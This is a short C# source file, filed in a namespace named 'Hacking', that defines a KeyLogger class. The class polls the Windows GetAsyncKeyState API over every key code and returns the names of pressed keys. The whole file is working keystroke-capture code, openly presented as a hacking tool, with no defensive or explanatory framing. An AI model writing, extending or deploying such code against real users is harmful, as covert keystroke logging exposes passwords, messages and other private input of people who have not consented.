using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Creek.Tools.Hacking
{
    public class KeyLogger
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        public IEnumerable<string> Read()
        {
            
                foreach (int i in Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {
                        yield return (Enum.GetName(typeof(Keys), i) + " ");
                    }
                }
          
        }
    }
}